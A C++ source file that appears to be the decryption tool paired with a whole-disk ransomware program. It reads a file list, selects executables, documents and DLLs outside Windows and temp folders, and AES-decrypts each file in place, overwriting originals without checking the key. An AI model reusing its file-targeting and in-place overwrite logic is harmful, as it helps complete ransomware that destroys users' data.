#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <iostream>
#include <Windows.h>

#include "aes256.cpp"

#define BUFFER_SIZE 1024*1024

#ifdef __APPLE__
#define fseeko64 fseeko
#endif

using namespace std;

int decrypt(char *ginput, char *gkey) {
    ByteArray key, dec;
    size_t file_len;
    FILE *input, *output;
    srand(time(0));
    size_t key_len = 0;
    char *goutput = (char*)"tmp";
    while (gkey[key_len])
        key.push_back(gkey[key_len++]);
    input = fopen(ginput, "rb");
    output = fopen(goutput, "wb");
    Aes256 aes(key);
    fseeko64(input, 0, SEEK_END);
    file_len = ftell(input);
    fseeko64(input, 0, SEEK_SET);
    aes.decrypt_start(file_len);
    while (!feof(input)) {
        unsigned char buffer[BUFFER_SIZE];
        size_t buffer_len;
        buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
        if (buffer_len > 0) {
            dec.clear();
            aes.decrypt_continue(buffer, buffer_len, dec);
            fwrite(dec.data(), dec.size(), 1, output);
        }
    }
    dec.clear();
    aes.decrypt_end(dec);
    fwrite(dec.data(), dec.size(), 1, output);
    fclose(input);
    fclose(output);
    CopyFile(goutput, ginput, 0);
    return 0;
}

bool endsWith(const std::string &mainStr, const std::string &toMatch)
{
    if(mainStr.size() >= toMatch.size() &&
       mainStr.compare(mainStr.size() - toMatch.size(), toMatch.size(), toMatch) == 0)
        return true;
    else
        return false;
}

int main(int argc, char** argv) {
    cout << "Are you sure you want to decrypt your whole disk? y/n -> ";
    char choice = 'n';
    cin >> choice;
    if (choice != 'y') {
        exit(0);
    }

    string key_str;
    cout << "Enter your decryption key -> ";
    cin >> key_str;
    char *key = new char[key_str.length() + 1];
    strcpy(key, key_str.c_str());
    cout << "Your key -> " << key << "\n";

    ifstream ifs("list");
    string line;

    while(getline(ifs, line))
    {
        if (line.find("Windows") != string::npos) {
            continue;
        }
        else if (line.find("temp") != string::npos) {
            continue;
        }
        else if (line.find("Temp") != string::npos) {
            continue;
        }
        else if (endsWith(line, ".dll")) {
            if (line.find("Nls") != string::npos) {
                continue;
            }
        }
        else if (endsWith(line, ".exe")) {
        }
        else if (endsWith(line, ".bat")) {
        }
        else if (endsWith(line, ".txt")) {
        }
        else if (endsWith(line, ".docx")) {
        }
        else if (endsWith(line, ".doc")) {
        }
        else {
            continue;
        }
        char *line_char = new char[line.length() + 1];
        strcpy(line_char, line.c_str());
        cout << line_char << "\n";
        decrypt(line_char, key);

    }
    cout << "Done decrypting, bye bye! ;)\n";
    cin.get();
    return 0;
}